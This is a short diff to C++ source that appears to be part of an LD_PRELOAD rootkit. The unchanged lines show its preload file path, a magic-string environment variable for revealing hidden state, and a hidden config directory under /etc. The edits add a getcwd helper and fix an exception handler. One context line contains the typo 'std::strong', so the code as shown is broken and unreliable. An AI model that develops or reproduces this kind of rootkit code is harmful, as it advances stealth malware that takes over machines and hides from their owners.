@@ -8,6 +8,7 @@
 #include <string>
 #include <memory>
 #include <sstream>
+#include <new>
 
 #include <cstdio>
 #include <cerrno>
@@ -36,6 +37,7 @@
 #endif
 const char *prelFileName = "/etc/ld.so.preload";
 const char *prelFileNameClear = "ld.so.preload";
+const char *linuxConfigPath = "/etc";
 const char *envShowName = "REAL_STATE_OF_THINGS";
 const char *envShowValue = MAGIC_STRING;
 #define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear)
@@ -69,6 +71,18 @@ const int nameSize = 512;
 //
 // Classes, structures and functions
 //
+std::string getCwdEasy () {
+	int strSz = 16, i = 1;
+	std::string tmp;
+	
+	tmp.resize (strSz);
+	while (getcwd (&tmp[0], tmp.size ()) == NULL && errno == ERANGE) {
+		++i;
+		tmp.resize (i * strSz);
+	}
+	
+	return tmp;
+}
 
 std::string intToString (int var) {
 	istringstream issCnv;
@@ -87,8 +101,8 @@ std::string readLinkName (const std::string & name) {
 		ret = readlink (name.c_str (), &dat[0], nameSize);
 		dat[ret] = '\0';
 		str = &dat[0];
-	} catch (std::exception & Exc) {
-		return std::unique_ptr <char []> ();
+	} catch (std::bad_alloc & Exc) {
+		return std::string ();
 	}
 	
 	return str;
